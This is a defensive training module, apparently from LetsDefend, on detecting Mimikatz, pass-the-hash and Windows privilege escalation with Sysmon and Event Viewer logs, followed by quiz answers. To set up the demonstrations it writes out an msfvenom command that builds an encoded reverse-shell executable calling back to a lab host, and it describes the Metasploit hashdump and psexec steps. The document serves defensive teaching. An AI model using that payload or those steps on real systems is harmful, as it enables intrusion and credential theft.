# Log Analysis with Sysmon

Sysmon is one of the most important log sources on Windows machines. Learn how to find evidence with it.

**Table of Contents:**

- [Introduction and Set Up of Sysmon](#introduction-and-set-up-of-sysmon)
- [Detecting Mimikatz with Sysmon](#detecting-mimikatz-with-sysmon)
- [Detecting Pass The Hash with Sysmon](#detecting-pass-the-hash-with-sysmon)
- [Detecting Privilege Escalation with Sysmon](#detecting-privilege-escalation-with-sysmon)

Evaluate Yourself with Quiz

- [Log Analysis with Sysmon Quiz](https://app.letsdefend.io/training/quiz/log-analysis-with-sysmon-quiz)

Challenge

- [Log Analysis With Sysmon](https://app.letsdefend.io/challenge/log-analysis-with-sysmon)

## Introduction and Set Up of Sysmon

### **1. Introduction**

One of the most essential activities of information systems is to  keep a log record. Thanks to the log records, it is possible to find out when, how, and from where an attack on the system was made.

Throughout the article, the use of the Sysmon tool developed by  Microsoft and the analysis of several types of attacks frequently seen  in Windows operating systems will be introduced.

### **2. Sysmon**

Sysmon (system monitor) is a tool developed by Microsoft that records the activities on the system it is installed on.

### **2.1. Setup**

**Sysmon:** https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon.

Then, by going to the directory where the downloaded file is located  with “cmd”, the installation is done in default settings with the  command “**Sysmon.exe -i -accepteula**”.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-34.png)

### **2.2. Configuration**

When Sysmon is installed, it installs with its own default  configuration file. However, it is also possible for the user to create  their own configuration file. Sysmon uses XML file format for  configuration.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-35.png)

There are 2 main sections for the configuration file : HashAlgorithms and EventFiltering.

Processes created in the HashAlgorithms section are used to specify  which hash algorithms to use, while EventFiltering is used to identify  specifically monitored or excluded events.

The following patterns are used to include or exclude events.  “include” statements are used to include and “exclude” statements are  used to exclude.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/tags-1.png)

The tags used in filtering are indicated in the image below.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/tags.png)

In the example below, Sysmon will not do any logging during the creation of the process.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-36.png)

**“condition”** types and features:

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-37.png)

### **2.3. Events**

The records created by Sysmon can be accessed via Event Viewer by clicking "**Applications and Services Logs/Microsoft/Windows/Sysmon/Operational**".

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-38.png)

The meanings of the Event IDs in the records are provided in the image below.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-39.png)

### **2.4. Hashes**

Most records show the hash values of the process. If a suspicious  record is seen, the relevant hash can be searched through sites such as  virustotal.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-40.png)

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-41.png)

## Detecting Mimikatz with Sysmon

### **Sysmon**

Sysmon is a tool developed by Microsoft that provides the activities  of the device to be recorded. It includes detailed information for  activities such as processes and network connections and ensures that  abnormal situations can be detected. Detailed information for  installation and configuration can be found on Microsoft's website.

https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon

### **Mimikatz**

It is a tool to obtain passwords from memory in Windows systems.

**Mimikatz :** https://github.com/gentilkiwi/mimikatz

We will talk about 3 different ways to detect mimikatz in the system using Sysmon:

- Monitoring files named Mimikatz
- Monitoring hash
- Tracking the ”lsass.exe”

### **Monitoring files named Mimikatz**

Monitoring the files named "mimikatz" created in the system is an  option for detection. However, the file name can be changed easily, so  it is easy to bypass.

Sysmon configuration:

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-42.png)

Sysmon output:

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-43.png)

Looking at the output, it is understood that the "mimikatz.exe" file is extracted from the compressed file.

### **Monitoring Hash**

When a process with hash values belonging to Mimikatz is started,  Sysmon can be made to generate a warning. Since the hash value will be  renewed with a small change in the file, this method is not very healthy either.

Looking at the hash value of "mimikatz.exe", it is seen that it is "010D11288BAF561F633D674E715A2016".

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-44.png)

The hash value will change when a small addition is made to the file.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-45.png)

Configuration required to see if the file with the hash value "010D11288BAF561F633D674E715A2016" is executed:

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-49.png)

Sysmon output:

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-46.png)

### **Tracking ”lsass.exe”**

Mimikatz uses lsass.exe to capture passwords. With the monitoring of  "lsass.exe", the processes that use it are also recorded. This way, not  only mimikatz but all suspicious processes that use lsass.exe are  recorded.

**Configuration**:

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-47.png)

Processes that call "lsass.exe" for legal activities can be excluded to achieve more effective results.

Sysmon output:

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-48.png)

### Questions

1 - What is the username running Mimikatz on the system? (Without computer name)

> **Answer:** LetsDefend

2 - What is the MD5 value of the mimikatz.exe run?

> **Answer:** 29EFD64DD3C7FE1E2B022B7AD73A1BA5

3 - What is the full directory where Mimikatz.exe is located? 

> **Answer:** C:\Users\LetsDefend\Documents\mimikatz_trunk\x64\mimikatz.exe

4 - What is the Process ID of mimikatz.exe run on “10/4/2022 7:09:46 AM”?

> **Answer:** 6372

## Detecting Pass The Hash with Sysmon

### **Pass The Hash**

Pass the hash is an attack targeting Windows systems that allows the  attacker to connect to the target using a hash instead of using a  password.

Password hashes are available on Lsass.exe and various tools such as  Gsecdump, pwdump7, mimikatz, and Metasploit hashdump module have been  produced to obtain the hash. When these tools are run by authorized  users, the desired data is obtained.

### **3.1. Example Attack**

In order to establish the first contact with the target system,  malware is sent to the victim via e-mail or other methods. For this  attack, the malware was created with msfvenom.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-63.png)

(Created reverse shell with msfvenom)

**Command:** msfvenom -a x86 --platform windows -p  windows/shell/reverse_tcp lhost=192.168.2.120 lport=4343 -b '\x00' -e  x86/shikata_ga_nai -f exe -o shell.exe 



After the malware is sent to the victim, the meterpreter session is expected.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-62.png)

(Waiting for the victim to open the file)

The meterpreter session starts when the target person opens the file. 



![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-61.png)

After the session, the hashdump module is used to obtain password  hashes, but the process cannot be performed because the necessary  privileges are not available.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-60.png)

In this case, it is necessary to upgrade the privileges on the target system.

With the "ps" command, the processes running on the system are listed and the process running with NT AUTHORITY\SYSTEM authority is searched.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-59.png)

After the relevant process is found, it is switched to the process  with the "migrate" command, and its system privileges are accessed.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-58.png)

After having the highest privileges to be reached, password hashes are obtained with the hashdump module.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-57.png)

After the hashes are obtained, the relevant data is loaded into the  psexec module in Metasploit and the attack is started and the system is  accessed by the admin user.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-56.png)

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-55.png)

As you can see, with the pass-the-hash attack, it is possible to  switch using the hash value even though the admin user's password is  unknown.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-54.png)

### **3.2. Detection of the Attack**

Since normal behavior is exhibited on the network with the Pass the  hash attack, it will be very problematic to examine the network traffic  in the detection of the attack. For this reason, it is more reasonable  to examine the log records with the "Event Viewer".

First of all, in order to ensure that the session records are kept,  open the "Local Group policy editor" and check whether the Success and  Failure options are active in the "Audit account logon events" section.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-53.png)

Then, the user session records are examined with the Event Viewer.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-52.png)

While searching here, firstly the records with the "event id" of 4624 are examined. The records with the ID 4624 represent the sessions that  have successfully logged into the system.

Continue with the remaining records with a "Logon type" of 3. Logon  type 3 represents connecting to the system from another place in the  network.

“Security ID” is usually “NULL SID” in pass hash attacks.

In addition to these extractions, records with "Logon Process"  NtLmSsP and "Key Length" 0 are searched. In a normal connection like  RDP, the key length is 128 bits.

After the mentioned extractions are done, the pass the hash attacks on the system will be detected.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-51.png)

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-50.png)

There are all indications of the attack in the recording seen in the  images above. In addition to these, the fact that the Workstation name  in the 2nd image is a random expression is also noteworthy.

As a result, it is understood that the attacker with an IP address of 192.168.2.120 has infiltrated the system as an “admin” user with a  pass-the-hash attack.

We talked about how to detect an attacker who has infiltrated the  system with the "Pass The Hash" method, with the login event logs.  Thanks to Sysmon, the post-exploitation activities of the intruder can  be easily caught. As mentioned in the previous topics, the processes  created and their details can be accessed thanks to the "ID: 1 - Process Create" log. It is necessary to follow the other logs that Sysmon  offers, as it will be easier to catch abnormal activities with the  "Process Create" logs, this log is more focused on.

In short, thanks to Sysmon, we follow the steps taken by the attacker in the system step by step.

## Detecting Privilege Escalation with Sysmon

### **Privilege Escalation**

Accessing high-level privileges by using errors or misconfigurations  on the system is defined as privilege escalation. Some privilege  escalation techniques are discussed below.

### **4.1. Weak Service Permissions**

When service permissions are given to users that they do not need to  have, privileges such as starting, stopping, and changing the settings  of the services are also granted.

Below is an example of a privilege escalation related to service permissions.

The "Ali" user, who does not have any authority in the system, starts to examine the services on the system and the 'UPDATE' service draws  his attention.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-81.png)

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-80-new.png)

It examines the permissions of the service with the "accesschk" tool and sees that everyone has the right to change the service.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-79-new.png)

Then, it changes the path of the file that the 'UPDATE' service runs, directs it to the malware it created, and starts the service.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-78-new.png)

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-77-new.png)

And the system, which was run with system privileges, opened the  malicious software that the attacker had created, allowing the attacker  to access the system privileges.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-76.png)

Looking at the log records with Sysmon, it is seen that the Register  with the Event ID 13 has been changed. The updated file shows the  changes made on it. 

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-75-new.png)

To understand how the relevant change was made, the previous log records should be examined.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-74-new.png)

The attacker who made the changes started the service and also ran the malware and gained system privileges.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-73-new.png)

Looking at the records with Event ID 3, it is seen that a connection  is opened to the attacker with NT AUTHORITY\SYSTEM privileges.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-72.png)

### **4.2. Insecure Registry Permissions**

The right to modify the registry should only be given to authorized  users. In the example below, the "Authenticated Users" group has been  given full authorization for the "UPDATE" service.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-71-new.png)

User “Ali”, who does not have full authority in the system, changes  the ImagePath value of the relevant service and directs him to the  malware he created.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-70-new.png)

When the service is started, the attacker will have reached NT  AUTHORITY\SYSTEM privileges on the target system through his own server.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-69.png)

Looking at the Sysmon logs, it can be verified that user Ali attempted to modify the registry via cmd.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-68-new.png)

The change made by the user Ali was accepted since the logged-in  users have the right to make changes on the registry. The event ID being 13 indicates that the change has been recorded.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-67-new.png)

### **4.3. Metasploit Getsystem Command**

After obtaining the meterpreter session in Metasploit, the privilege escalation is attempted with the "getsystem" command.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-66.png)

Looking at the records with Sysmon, the service consisting of a  random expression was created and started to be revived with cmd.exe.  Thus, cmd was accessed with "NT AUTHORITY\SYSTEM" privileges.

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-65.png)

![img](https://ld-images-2.s3.us-east-2.amazonaws.com/Log+Analysis+with+Sysmon/image-64.png)

### **Conclusion**

How to analyze the activities on the system with Sysmon is discussed. At the same time, it is also discussed how to detect and analyze  popular attacks against Windows with Sysmon.

### Questions

1 - What is the name of the service that tries to run Mimikatz.exe?

> **Answer:** Default_Service

2 - Which service's ImagePath value has been replaced with "update.exe"?

> **Answer:** TEST_SERVICE